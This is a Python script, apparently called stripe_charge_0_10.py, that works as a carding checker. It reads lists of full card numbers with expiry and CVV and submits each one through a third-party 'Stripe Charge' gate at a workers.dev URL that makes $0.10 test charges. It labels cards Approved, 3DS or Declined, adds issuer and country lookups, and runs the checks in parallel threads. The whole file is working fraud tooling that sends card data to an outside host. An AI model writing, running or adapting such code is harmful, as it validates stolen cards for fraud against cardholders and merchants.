import requests
import json
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# We use this to get the country emoji
def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    return chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)

def get_bin_info(cc_number):
    bin_number = cc_number[:6]
    
    # Try using binlist net
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {"Accept-Version": "3"}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            brand = data.get("scheme", "UNKNOWN").upper().strip()
            card_type = data.get("type", "UNKNOWN").upper().strip()
            country_name = data.get("country", {}).get("name", "UNKNOWN").upper().strip()
            country_emoji = data.get("country", {}).get("emoji", "")
            issuer = data.get("bank", {}).get("name", "UNKNOWN").upper().strip()
            return f"Bin : {bin_number} - Brand : {brand} - Type : {card_type} - Country : {country_name} {country_emoji} - Issuer : {issuer}"
    except Exception:
        pass

    # Fallback to handyapi
    try:
        url = f"https://data.handyapi.com/bin/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            brand = (data.get("Scheme") or "UNKNOWN").upper().strip()
            card_type = (data.get("Type") or "UNKNOWN").upper().strip()
            country_name = (data.get("Country", {}).get("Name") or "UNKNOWN").upper().strip()
            country_code = data.get("Country", {}).get("A2")
            country_emoji = get_flag_emoji(country_code) if country_code else ""
            issuer = (data.get("Issuer") or "UNKNOWN").upper().strip()
            return f"Bin : {bin_number} - Brand : {brand} - Type : {card_type} - Country : {country_name} {country_emoji} - Issuer : {issuer}"
    except Exception:
        pass
    
    return f"Bin : {bin_number} - Brand : UNKNOWN - Type : UNKNOWN - Country : UNKNOWN - Issuer : UNKNOWN"

def check_card(card):
    # API URL
    url = f"https://stripe.melmelmel.workers.dev/?card={card}"
    try:
        resp = requests.get(url, timeout=30, verify=False)
        data = resp.json()
        
        status = data.get("status", "ERROR")
        response_msg = data.get("message", "Unknown")
        
        if status == "CHARGED" or "succeeded" in response_msg.lower():
            status_text = "Approved!✅"
            response_text = "Succeeded"
        elif status == "3DS":
            status_text = "3DS!⚠️"
            response_text = response_msg
        else:
            status_text = "Declined!❌"
            response_text = response_msg
            
        bin_info = get_bin_info(card)
        
        result_text = f"""
Stripe Charge 0.10$

CC : {card}
Status : {status_text}
Response : {response_text}
Gates : Stripe Charge

{bin_info}
"""
        print(result_text.strip() + "\n")
        return result_text, status
    except Exception as e:
        print(f"Error checking {card}: {e}")
        return None, "ERROR"

def check_list(file_path):
    cards = []
    try:
        with open(file_path, "r") as f:
            cards = [line.strip() for line in f if '|' in line]
    except FileNotFoundError:
        print(f"File {file_path} not found. Please create it first.")
        return
        
    print(f"Loaded {len(cards)} cards. Starting check...\n")
    print("=" * 50)
    
    charged = 0
    declined = 0
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_card, card): card for card in cards}
        for future in as_completed(futures):
            res, status = future.result()
            if status in ["CHARGED", "Approved!✅"]:
                charged += 1
            elif status != "ERROR":
                declined += 1
                
    print("=" * 50)
    print(f"Done! Charged/Approved: {charged} | Declined: {declined}")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        
        # If target has '|' we assume it's a single card
        if '|' in target:
            check_card(target)
        else:
            check_list(target)
    else:
        print("Usage: python stripe_charge_0_10.py <cards.txt or CARD|MM|YY|CVV>")
        print("Wait 3 seconds defaulting to testing temp_cards.txt...")
        time.sleep(3)
        check_list("temp_cards.txt")
